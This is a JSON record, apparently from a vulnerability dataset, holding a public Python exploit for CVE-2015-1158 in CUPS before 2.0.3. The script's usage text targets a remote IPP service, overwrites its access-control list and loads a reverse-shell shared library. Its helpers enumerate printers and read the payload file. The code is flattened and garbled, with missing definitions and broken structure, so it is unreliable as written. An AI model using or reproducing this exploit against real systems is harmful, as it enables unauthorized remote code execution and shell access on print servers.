{
    "text": "vul_name : CUPS <2.0.3 ， vul_cve : CVE-2015-1158 ， vul_poc :  #  ! /usr/bin/python ，  # Exploit Title : CUPS ，  # Google Dork : n/a ，  # Date : 2/2/17 ，  # Exploit Author :  @ 0x00string ，  # Vendor Homepage : cups.org ，  # Software Link :  ，  # Version : <2.0.3 ，  # Tested on : Ubuntu 14/15 ，  # CVE : CVE-2015-1158 ， from socket import *  ， from struct import *  ， print ' ， lol ty google ， 0000000000000 ， 0000000000000000000 00 ， 00000000000000000000000000000 ， 0000000000000000000000000000000 ， 000000000 0000000000 ， 00000000 0000000000 ， 0000000 000000000000 ， 0000000 000000000000000 ， 000000 000000000 000000 ， 0000000 000000000 000000 ， 000000 000000000 000000 ， 000000 000000000 000000 ， 000000 00000000 000000 ， 000000 000000000 000000 ， 0000000 000000000 0000000 ， 000000 000000000 000000 ， 0000000000000000 0000000 ， 0000000000000 0000000 ， 00000000000 00000000 ， 00000000000 000000000 ， 0000000000000000000000000000000 ， 00000000000000000000000000000 ， 000 0000000000000000000 ， 0000000000000 ，  @ 0x00string ， github.com/0x00string/oldays/CVE-2015-1158.py ， ' ， print ( \"python script.py <args>\\n\" ， \" -h , -help : Show this message\\n\" ， \" -a , -rhost : Target IP address\\n\" ， \" -b , -rport : Target IPP service port\\n\" ， \" -c , -lib /path/to/payload.so\\n\" ， \" -f , -stomp-only Only stomp the ACL ( no postex ) \\n\" ， \"\\n\" ， \"Examples : \\n\" ， \"python script.py -a 10.10.10.10 -b 631 -f\\n\" ， \"python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so\\n\" )  ， exit (  )  ， print \"\\x1b [ 32 ; 1m [ + ] \\x1b [ 0mt\" + m + \"\\n\" ,  ， elif ( t is \"-\" )  :  ， print \"\\x1b [ 31 ; 1m [ - ] \\x1b [ 0mt\" + m + \"\\n\" ,  ， elif ( t is \" * \" )  :  ， print \"\\x1b [ 34 ; 1m [  *  ] \\x1b [ 0mt\" + m + \"\\n\" ,  ， elif ( t is \" ! \" )  :  ， print \"\\x1b [ 33 ; 1m [  !  ] \\x1b [ 0mt\" + m + \"\\n\" ,  ， d , b , h = ' ,  [  ]  ,  [  ]  ， u = list ( input )  ， h.append ( e.encode ( \"hex\" )  ， b.append ( '0' )  ， elif 30 > ord ( e ) or ord ( e ) > 128 :  ， b.append ( '.' )  ， elif 30 < ord ( e ) or ord ( e ) < 128 :  ， b.append ( e )  ， i = 0 ， d += ' '.join ( h [ i : i+16 ]  )  ， d += \" \" ， d += ' '.join ( b [ i : i+16 ]  )  ， d += \"\\n\" ， i = i + 16 ， d += ' '.join ( h [ i :  ( len ( h ) - 0 )  ]  )  ， pad = len ( ' '.join ( h [ i :  ( len ( h ) - 0 )  ]  )  ， d += ' ' *  ( 56 - pad )  ， d += ' '.join ( b [ i :  ( len ( h ) - 0 )  ]  )  ， d += \"\\n\" ， i = i + len ( h )  ， self.sock = socket (  ， AF_INET , SOCK_STREAM )  ， self.sock.settimeout ( 30 )  ， self.sock = sock ， self.sock.connect ( host , int ( port )  ， self.sock.send ( msg )  ， tmp = self.sock.recv ( 1024 )  ， msg = \" ， msg += tmp ， tmp = self.sock.recv ( 1024 )  ， sock = tcpsock (  )  ， elif ( proto is \"udp\" )  :  ， sock = udpsock (  )  ， sock.connect ( ip , port )  ， sock.tx ( txpacket )  ， rxpacket = sock.rx (  )  ， request = ( \"GET /printers HTTP/1.1\\x0d\\x0a\" ， \"Host : \" + rhost + \" : \" + rport + \"\\x0d\\x0a\" ， \"User-Agent : CUPS/2.0.2\\x0d\\x0a\" ， \"Connection : Close\\x0d\\x0a\" ， \"\\x0d\\x0a\" )  ， response = txrx ( rhost , int ( rport )  , \"tcp\" , request )  ， m = re.search ( '<TR><TD><A HREF=\" ( .+ ) \">.+</A></TD><TD>.+</TD><TD></TD><TD>.+</TD><TD>' , response )  ， printer = m.group ( 1 )  ， pretty ( \"+\" , \"printer found : \" + printer )  ， pretty ( \"-\" , \"no printers\" )  ， exit ( 1 )  ， with open ( libpath , 'rb' ) as f :  ， payload = f.read (  ) ",
    "time": "2017.02.03"
}